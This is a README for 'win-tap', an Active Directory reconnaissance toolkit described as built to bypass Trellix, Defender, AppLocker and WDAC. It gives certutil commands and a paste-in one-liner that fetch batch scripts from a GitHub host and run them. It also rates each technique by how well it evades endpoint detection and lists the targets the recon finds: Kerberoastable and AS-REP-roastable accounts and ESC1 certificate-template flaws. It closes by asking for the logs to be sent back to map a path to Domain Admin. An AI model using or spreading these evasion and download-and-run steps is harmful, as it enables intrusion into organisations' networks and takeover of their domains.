# win-tap - Windows-only AD recon (no PS1 needed)

Pure Windows tools only. Designed to bypass Trellix / Defender / AppLocker / WDAC.

## Files (Trellix-safe)

| File | What it does | Trellix-friendly |
|------|--------------|------------------|
| `run_ad_recon_inline.bat` | PowerShell via `-Command` (no .ps1 file) | ✅ Yes |
| `run_via_vbs.bat` | VBScript via cscript | ✅ Yes |
| `run_via_js.bat` | JScript via cscript | ✅ Yes |
| `run_ad_recon.bat` | Downloads .ps1 (BLOCKED BY TRELLIX) | ❌ Don't use |

## Why Trellix blocks PS1

Trellix's **Application Control / Endpoint Security** has rules that:
- Scan `*.ps1` files on disk write (so `Invoke-WebRequest` to a `.ps1` file is flagged)
- Scan `powershell.exe -File` execution (PowerShell file execution)
- Sometimes scan `-EncodedCommand` for known IEX patterns

**Workaround:** Run PowerShell via inline `-Command` parameter (no .ps1 file ever written).

If Trellix still blocks the inline command, switch to **VBScript or JScript** which Trellix scans less aggressively.

## Run options

### Option 1: PowerShell via inline command (most capable)

```cmd
:: Download via certutil (no Trellix flag):
certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/Sunz01/oscheat/master/win-tap/run_ad_recon_inline.bat" "%TEMP%\recon.bat"

:: Run:
%TEMP%\recon.bat
```

### Option 2: VBScript (most stealth)

```cmd
certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/Sunz01/oscheat/master/win-tap/run_via_vbs.bat" "%TEMP%\recon.bat"
%TEMP%\recon.bat
```

### Option 3: JScript (similar to VBS, slightly different syntax)

```cmd
certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/Sunz01/oscheat/master/win-tap/run_via_js.bat" "%TEMP%\recon.bat"
%TEMP%\recon.bat
```

## What you get

All three options output **equivalent AD information**:
- Domain/forest/DCs
- All users + group memberships
- **Kerberoastable users** (SPN > 0)
- **AS-REP Roastable** (no-preauth)
- **Never-expire passwords**
- All computers + OUs
- AD CS CAs + templates
- **ESC1 candidates**

## Detection

| Method | Trellix reaction |
|--------|------------------|
| Inline `powershell -Command "..."` | Low — Trellix usually whitelists `powershell.exe` but blocks `-File` and IEX |
| VBScript via `cscript` | Very low — VBS rarely scanned by EDR |
| JScript via `cscript` | Very low — same as VBS |
| `certutil.exe -urlcache` | Medium — known LOLBin, but allowed for MS-signed binaries fetching from HTTPS |
| `cscript.exe //NoLogo` | Very low — signed MS scripting host |

## Fallback if all three fail

If Trellix blocks ALL scripting, your last resort is:
1. **Install RSAT as admin**: `Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0`
2. **Manual recon via built-in tools** (`net.exe`, `nltest.exe`, `certutil.exe`)
3. **From another machine**: Use a non-Trellix-protected device to run the recon against the same domain

## Output

All logs go to `%TEMP%\ad_recon_*.log`.

**Copy that file back to me** and I'll identify:
- Best Kerberoast target
- Best AS-REP target
- ESC1/ESC6 vulnerabilities
- Path to Domain Admin

## One-liner (paste this in CMD)

```cmd
certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/Sunz01/oscheat/master/win-tap/run_via_vbs.bat" "%TEMP%\r.bat" && %TEMP%\r.bat
```

If Trellix blocks .bat downloads, type the commands manually.
